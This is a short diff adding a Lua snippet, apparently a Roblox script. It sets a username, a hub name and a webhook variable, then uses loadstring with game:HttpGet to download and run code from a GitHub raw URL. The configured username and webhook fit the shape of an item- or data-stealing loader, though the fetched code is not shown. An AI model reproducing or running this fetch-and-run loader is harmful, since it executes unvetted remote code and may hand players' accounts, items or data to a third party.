@@ -1,0 +1,6 @@
+```lua
+_G.Username = "Pobu_0"
+_G.HubName = "Milk hub"
+_G.WebhookUrl = "No raid lol"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()```
